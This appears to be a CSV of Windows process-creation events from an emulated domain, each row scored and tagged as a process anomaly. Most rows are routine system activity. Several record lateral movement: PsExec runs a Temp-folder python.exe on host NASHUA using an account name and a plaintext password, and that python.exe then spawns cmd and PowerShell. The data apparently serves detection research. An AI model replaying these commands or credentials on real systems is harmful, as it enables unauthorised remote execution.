,NEWYORK$,2020-05-02 03:16:36.688000+00:00,wec.internal.cloudapp.net,NEWYORK.dmevals.local,4688,0x3e7,0x3b0,,0x0,,,-,,C:\windows\system32\wbem\wmiprvse.exe -Embedding,C:\Windows\System32\svchost.exe,0x15f8,,,-1,proc_anomaly,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:17:50.805000+00:00,74.117,svchost.exe -> wmiprvse.exe,14.0
,NEWYORK$,2020-05-02 03:16:39.321000+00:00,wec.internal.cloudapp.net,NEWYORK.dmevals.local,4688,0x3e7,0x3b0,,0x3e4,,,NEWYORK$,,C:\windows\system32\wbem\wmiprvse.exe -Embedding,C:\Windows\System32\svchost.exe,0x610,,,-1,proc_anomaly,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:17:50.805000+00:00,71.48400000000002,svchost.exe -> wmiprvse.exe,14.0
,pbeesly,2020-05-02 03:16:42.978000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x89177d,0x87c,,0x0,,,-,,C:\windows\system32\cmd.exe,C:\Windows\Temp\python.exe,0x2244,,,-1,proc_anomaly,C:\windows\system32\cmd.exe,cmd.exe,python.exe,False,False,2020-05-02 03:17:57.838000+00:00,74.86,python.exe -> cmd.exe,1.0
,SCRANTON$,2020-05-02 03:05:30.723000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\System32\svchost.exe -k WerSvcGroup,C:\Windows\System32\services.exe,0x1604,,,-1,proc_anomaly,C:\windows\System32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:07:33.442000+00:00,122.719,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:05:31.851000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\system32\svchost.exe -k netsvcs -p -s wlidsvc,C:\Windows\System32\services.exe,0x20cc,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:08:42.051000+00:00,190.2,services.exe -> svchost.exe,24.0
,pbeesly,2020-05-02 03:05:58.512000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0xdd8,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0x196c,,,-1,proc_anomaly,\??\C:\windows\system32\conhost.exe,conhost.exe,powershell.exe,False,False,2020-05-02 03:07:56.859000+00:00,118.347,powershell.exe -> conhost.exe,6.0
,pbeesly,2020-05-02 03:06:09.919000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3731f3,0x1158,,0x0,,,-,,"""C:\windows\system32\notepad.exe"" ",C:\Windows\explorer.exe,0x1b54,,,-1,proc_anomaly,"""C:\windows\system32\notepad.exe""",notepad.exe,explorer.exe,False,False,2020-05-02 03:18:25.038000+00:00,735.1189999999999,explorer.exe -> notepad.exe,1.0
,SCRANTON$,2020-05-02 03:06:14.119000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca",C:\Windows\System32\svchost.exe,0x18f4,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:07:15.085000+00:00,60.966,svchost.exe -> backgroundtaskhost.exe,18.0
,NEWYORK$,2020-05-02 03:06:14.184000+00:00,wec.internal.cloudapp.net,NEWYORK.dmevals.local,4688,0x3e7,0x2b8,,0x0,,,-,,C:\windows\system32\svchost.exe -k wusvcs -p -s WaaSMedicSvc,C:\Windows\System32\services.exe,0x1214,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:07:15.089000+00:00,60.905,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:08:52.499000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3e4,,,SCRANTON$,,C:\windows\system32\wbem\wmiprvse.exe -secured -Embedding,C:\Windows\System32\svchost.exe,0x1f40,,,-1,proc_anomaly,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:10:23.340000+00:00,90.841,svchost.exe -> wmiprvse.exe,14.0
,SCRANTON$,2020-05-02 03:10:24.460000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3e4,,,SCRANTON$,,C:\windows\system32\wbem\wmiprvse.exe -secured -Embedding,C:\Windows\System32\svchost.exe,0x47c,,,-1,proc_anomaly,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:11:55.428000+00:00,90.96799999999999,svchost.exe -> wmiprvse.exe,14.0
,NASHUA$,2020-05-02 03:10:40.675000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\system32\svchost.exe -k netsvcs -p -s gpsvc,C:\Windows\System32\services.exe,0x16a0,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:20:47.247000+00:00,606.572,services.exe -> svchost.exe,24.0
,pbeesly,2020-05-02 03:11:20.078000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0xf0c,,0x0,,,-,,"""C:\Program Files\SysinternalsSuite\PsExec64.exe"" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0xa6c,,,-1,proc_anomaly,"""C:\Program",program,powershell.exe,False,False,2020-05-02 03:19:26.010000+00:00,485.93199999999996,powershell.exe -> program,7.0
,SCRANTON$,2020-05-02 03:14:16.772000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0x1650,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:14:20.313000+00:00,3.5410000000000004,svchost.exe -> backgroundtaskhost.exe,18.0
,pbeesly,2020-05-02 03:06:59.643000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0x1464,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0x6c0,,,-1,proc_anomaly,\??\C:\windows\system32\conhost.exe,conhost.exe,powershell.exe,False,False,2020-05-02 03:07:50.836000+00:00,51.19300000000001,powershell.exe -> conhost.exe,6.0
,LOCAL SERVICE,2020-05-02 03:14:24.519000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e5,0xa0c,,0x0,,,-,,C:\windows\system32\AUDIODG.EXE 0x410 0x40c,C:\Windows\System32\svchost.exe,0xa68,,,-1,proc_anomaly,C:\windows\system32\AUDIODG.EXE,audiodg.exe,svchost.exe,False,False,2020-05-02 03:19:28.260000+00:00,303.7410000000001,svchost.exe -> audiodg.exe,1.0
,NASHUA$,2020-05-02 03:14:34.890000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x374,,0x30ba2c,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0x224c,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:14:37.202000+00:00,2.3120000000000003,svchost.exe -> backgroundtaskhost.exe,18.0
,pbeesly,2020-05-02 03:14:44.387000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0xf0c,,0x0,,,-,,"""C:\Program Files\SysinternalsSuite\PsExec64.exe"" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0x22e0,,,-1,proc_anomaly,"""C:\Program",program,powershell.exe,False,False,2020-05-02 03:18:22.014000+00:00,217.627,powershell.exe -> program,7.0
,NASHUA$,2020-05-02 03:15:05.593000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\PSEXESVC.exe,C:\Windows\System32\services.exe,0x658,,,-1,proc_anomaly,C:\windows\PSEXESVC.exe,psexesvc.exe,services.exe,False,False,2020-05-02 03:18:22.014000+00:00,196.421,services.exe -> psexesvc.exe,4.0
,NASHUA$,2020-05-02 03:15:05.621000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x658,,0x89177d,,,pbeesly,,"""C:\Windows\Temp\python.exe"" ",C:\Windows\PSEXESVC.exe,0xb88,,,-1,proc_anomaly,"""C:\Windows\Temp\python.exe""",python.exe,psexesvc.exe,False,False,2020-05-02 03:17:59.850000+00:00,174.229,psexesvc.exe -> python.exe,4.0
,pbeesly,2020-05-02 03:15:05.629000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x89177d,0xb88,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\Temp\python.exe,0x222c,,,-1,proc_anomaly,\??\C:\windows\system32\conhost.exe,conhost.exe,python.exe,False,False,2020-05-02 03:17:59.851000+00:00,174.222,python.exe -> conhost.exe,4.0
,pbeesly,2020-05-02 03:15:05.630000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x89177d,0xb88,,0x0,,,-,,"""C:\Windows\Temp\python.exe"" ",C:\Windows\Temp\python.exe,0x87c,,,-1,proc_anomaly,"""C:\Windows\Temp\python.exe""",python.exe,python.exe,False,False,2020-05-02 03:17:59.849000+00:00,174.21900000000005,python.exe -> python.exe,1.0
,pbeesly,2020-05-02 03:15:49.987000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x89177d,0x87c,,0x0,,,-,,powershell.exe,C:\Windows\Temp\python.exe,0x130c,,,-1,proc_anomaly,powershell.exe,powershell.exe,python.exe,False,False,2020-05-02 03:16:29.891000+00:00,39.904,python.exe -> powershell.exe,1.0
,NEWYORK$,2020-05-02 03:16:30.899000+00:00,wec.internal.cloudapp.net,NEWYORK.dmevals.local,4688,0x3e7,0x3b0,,0x0,,,-,,C:\windows\system32\wbem\wmiprvse.exe -Embedding,C:\Windows\System32\svchost.exe,0xc64,,,-1,proc_anomaly,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:17:50.805000+00:00,79.906,svchost.exe -> wmiprvse.exe,14.0
,SCRANTON$,2020-05-02 03:16:53.493000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0x1cac,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:16:54.670000+00:00,1.177,svchost.exe -> backgroundtaskhost.exe,18.0
,NASHUA$,2020-05-02 03:17:12.923000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x374,,0x30ba2c,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0x2204,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:17:14.069000+00:00,1.146,svchost.exe -> backgroundtaskhost.exe,18.0
,SCRANTON$,2020-05-02 03:17:27.341000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0x1218,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:17:27.348000+00:00,0.006999999999999999,svchost.exe -> backgroundtaskhost.exe,18.0
,NASHUA$,2020-05-02 03:17:45.690000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x374,,0x30ba2c,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0x1e4c,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:17:45.697000+00:00,0.006999999999999999,svchost.exe -> backgroundtaskhost.exe,18.0
,SCRANTON$,2020-05-02 03:19:31.433000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x0,,,-,,C:\windows\system32\svchost.exe -k LocalSystemNetworkRestricted -s WPDBusEnum,C:\Windows\System32\services.exe,0x73c,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:22:47.943000+00:00,196.51,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:19:32.481000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x498,,0x0,,,-,,taskhostw.exe ExploitGuardPolicy,C:\Windows\System32\svchost.exe,0x824,,,-1,proc_anomaly,taskhostw.exe,taskhostw.exe,svchost.exe,False,False,2020-05-02 03:20:01.059000+00:00,28.578000000000007,svchost.exe -> taskhostw.exe,10.0
,SCRANTON$,2020-05-02 03:19:34.253000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x0,,,-,,C:\windows\System32\svchost.exe -k NetSvcs -p -s NcaSvc,C:\Windows\System32\services.exe,0x820,,,-1,proc_anomaly,C:\windows\System32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:19:34.267000+00:00,0.013999999999999999,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:20:00.672000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x3b0,,0x3e4,,,SCRANTON$,,C:\windows\system32\wbem\wmiprvse.exe -secured -Embedding,C:\Windows\System32\svchost.exe,0x1098,,,-1,proc_anomaly,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:22:49.997000+00:00,169.32500000000005,svchost.exe -> wmiprvse.exe,14.0
,SCRANTON$,2020-05-02 03:20:55.868000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x0,,,-,,C:\windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p -s NgcSvc,C:\Windows\System32\services.exe,0x19a4,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:23:02.319000+00:00,126.451,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:21:01.815000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x3b0,,0x13069a,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:Microsoft.MicrosoftOfficeHub.AppX54h2e8jwdm50fj5ha8987vz1etpx7czd.mca",C:\Windows\System32\svchost.exe,0xe08,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:22:10.993000+00:00,69.178,svchost.exe -> backgroundtaskhost.exe,18.0
,SCRANTON$,2020-05-02 03:21:08.297000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x3b0,,0x13069a,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca",C:\Windows\System32\svchost.exe,0x1e34,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:22:09.719000+00:00,61.422,svchost.exe -> backgroundtaskhost.exe,18.0
,NASHUA$,2020-05-02 03:21:55.982000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x374,,0x3e4,,,NASHUA$,,C:\windows\system32\wbem\wmiprvse.exe -secured -Embedding,C:\Windows\System32\svchost.exe,0x22c8,,,-1,proc_anomaly,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:24:04.126000+00:00,128.144,svchost.exe -> wmiprvse.exe,14.0
,UTICA$,2020-05-02 03:22:30.609000+00:00,wec.internal.cloudapp.net,UTICA.dmevals.local,4688,0x3e7,0x384,,0x3e4,,,UTICA$,,C:\windows\system32\wbem\wmiprvse.exe -secured -Embedding,C:\Windows\System32\svchost.exe,0x1258,,,-1,proc_anomaly,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:24:09.175000+00:00,98.566,svchost.exe -> wmiprvse.exe,14.0
,SCRANTON$,2020-05-02 03:22:51.096000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x3b0,,0x13069a,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca",C:\Windows\System32\svchost.exe,0x1124,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:23:51.981000+00:00,60.88500000000001,svchost.exe -> backgroundtaskhost.exe,18.0
,NASHUA$,2020-05-02 03:25:34.881000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x374,,0x0,,,-,,C:\Windows\System32\usocoreworker.exe -Embedding,C:\Windows\System32\svchost.exe,0x1828,,,-1,proc_anomaly,C:\Windows\System32\usocoreworker.exe,usocoreworker.exe,svchost.exe,False,False,2020-05-02 03:26:41.515000+00:00,66.634,svchost.exe -> usocoreworker.exe,2.0
,UTICA$,2020-05-02 03:26:13.314000+00:00,wec.internal.cloudapp.net,UTICA.dmevals.local,4688,0x3e7,0x384,,0x0,,,-,,C:\Windows\System32\usocoreworker.exe -Embedding,C:\Windows\System32\svchost.exe,0x1488,,,-1,proc_anomaly,C:\Windows\System32\usocoreworker.exe,usocoreworker.exe,svchost.exe,False,False,2020-05-02 03:27:20.837000+00:00,67.52300000000001,svchost.exe -> usocoreworker.exe,2.0
